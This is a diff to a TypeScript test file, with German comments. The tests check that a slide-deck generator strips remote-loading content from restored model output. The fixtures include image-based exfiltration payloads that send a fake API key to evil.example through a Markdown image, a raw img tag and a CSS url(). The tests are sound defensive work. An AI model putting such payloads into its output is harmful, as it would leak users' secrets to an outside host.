@@ -1,10 +1,10 @@
 import { describe, it, expect, vi } from "vitest";
 import { runGenerateDeck } from "../src/generate-deck";
+import { renderMarkdown } from "../src/vendor/deck-core/pure/render/md2html";
 
-const opts = { model: "m", sentModel: "m", params: { temperature: 0.7, max_tokens: 8192 } };
 const baseMessages = [{ role: "user" as const, content: "src" }];
 function deps(client: any, over: any = {}) {
-  return { client, messages: baseMessages, streamOpts: opts, themeKey: "dark", signal: new AbortController().signal, onState: () => {}, ...over };
+  return { client, messages: baseMessages, themeKey: "dark", signal: new AbortController().signal, onState: () => {}, ...over };
 }
 
 describe("runGenerateDeck", () => {
@@ -62,5 +62,48 @@ describe("runGenerateDeck", () => {
   it("returns aborted on AbortError", async () => {
     const client = { generate: vi.fn(async () => { const e = new Error("Aborted"); e.name = "AbortError"; throw e; }) };
     expect((await runGenerateDeck(deps(client))).status).toBe("aborted");
+  });
+
+  describe("restaurierte Antwort: Fernquellen werden entschaerft (Sicherheitsgrenze der Schwaerzung)", () => {
+    const SECRET = "sk-abcdef0123456789abcdef";
+    const run = async (content: string) => {
+      const client = { generate: vi.fn(async () => ({ content, reasoning: "", usedFallback: false })) };
+      const r = await runGenerateDeck(deps(client));
+      expect(r.status).toBe("ok");
+      return r.markdown ?? "";
+    };
+
+    /** Laedt das gerenderte HTML etwas von aussen? (img/src, url() — was die Vorschau beim Rendern holt) */
+    const loadsRemote = (markdown: string): boolean => {
+      const html = renderMarkdown({ markdown, resolveEmbed: () => null }).html;
+      return /<(?:img|iframe|video|audio|source)\b[^>]*\bsrc=["']?https?:/i.test(html) || /url\(\s*["']?https?:/i.test(html);
+    };
+
+    it.each([
+      ["Markdown-Bild", `# A\n\n![x](https://evil.example/?d=${SECRET})`],
+      ["rohes <img>", `# A\n\n<img src="https://evil.example/h?d=${SECRET}">`],
+      ["url() in style", `# A\n\n<div style="background:url(https://evil.example/b?d=${SECRET})">x</div>`],
+    ])("%s laedt nach der Entschaerfung nichts mehr von aussen — und ohne sie schon (Gegenprobe)", async (_name, content) => {
+      expect(loadsRemote(content)).toBe(true);
+      expect(loadsRemote(await run(content))).toBe(false);
+    });
+
+    it("ein dataviewjs-Block laeuft nicht mehr als Prozessor-Fence", async () => {
+      const md = await run("# A\n\n```dataviewjs\ndv.pages()\n```");
+      expect(md).not.toMatch(/^```dataviewjs/m);
+    });
+
+    it("ein Deck mit Mermaid, Direktive, Code-Fence, Datei-Embed und data:-Bild bleibt unveraendert", async () => {
+      const body = [
+        "# A", "", "<!-- layout: two-column -->", "", "![[bild.png]]", "",
+        "```mermaid", "graph TD; A-->B", "```", "", "```ts", "const x = 1;", "```", "",
+        "![lokal](data:image/png;base64,AAAA)", "", "![rel](bilder/a.png)", "",
+        "---", "", "# B", "", "[Link](https://example.org)",
+      ].join("\n");
+      const md = await run(body);
+      for (const stueck of ["<!-- layout: two-column -->", "![[bild.png]]", "```mermaid", "```ts", "![lokal](data:image/png;base64,AAAA)", "![rel](bilder/a.png)", "[Link](https://example.org)"]) {
+        expect(md).toContain(stueck);
+      }
+    });
   });
 });
